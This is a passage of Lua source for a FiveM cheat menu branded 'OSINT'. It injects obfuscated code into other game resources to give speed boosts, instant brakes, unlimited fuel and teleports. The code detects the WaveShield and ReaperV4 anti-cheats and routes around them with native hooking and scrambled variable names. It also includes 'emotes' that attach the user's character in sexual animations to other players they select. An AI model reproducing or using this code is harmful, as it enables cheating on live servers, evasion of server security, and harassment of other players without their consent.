                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]])
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Boost Vehicle Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.superSpeedBoost = false
                                        ]])
                                    else
                                        Injection("any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Instant Brakes",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Instant Brakes On", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Instant Brakes On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Instant Brakes Off", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Instant Brakes Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Easy Handling",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                            or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                            or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Easy Handling On", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Easy Handling On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Easy Handling Off", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Easy Handling Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Rainbow Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                local target = GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any"
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Rainbow Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        print("souygdfg")
                                        Injection(target, [[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]])
                                    else
                                        Injection(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]])
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Rainbow Vehicle Off", 3000)
                                    if GetResourceState("WaveShield") == "started" then
                                        print("swave")
                                        Injection(target, [[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]])
                                    else
                                        Injection(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Unlimited Fuel", checked = false,
                            onSelect = function(checked)
                                if checked then
                                OSINT:Notify("success", "OSINT", "Unlimited Fuel On", 3000)
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]])
                                else
                                OSINT:Notify("error", "OSINT", "Unlimited Fuel Off", 3000)
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Emotes",
            type = "subMenu",
            categories = {
                {
                    label = "Emote Menu",
                    tabs = {
                        { type = "button", label = "Detach All Entitys",
                            onSelect = function()
                                print("dih")
                            MachoInjectResourceRaw("any", [[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]])
                            end
                        },
                        { type = "divider", label = "Emotes" },
                        {
                            type = "button",
                            label = "Twerk On Them",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared â€” detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]], playerId, playerId))
                                end

                                self:Notify("success", "OSINT", "Attempted to twerk on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                        { type = "divider", label = "Vehicle Emotes" },
                        {
                            type = "button",
                            label = "Blow Driver",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared â€” stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]], playerId, playerId))
                                end

                                self:Notify("success", "OSINT", "Attempted BlowDriver on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Teleports",
            type = "subMenu",
            categories = {
                {
                    label = "Teleport Menu",
                    tabs = {
                        { type = "button", label = "FIB Building",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'
                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])
                        elseif
                        ReaperStart then
                            MachoInjectThread(0, "any", "", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])
                        else
                            MachoInjectResourceRaw("any", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Mission Row PD",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

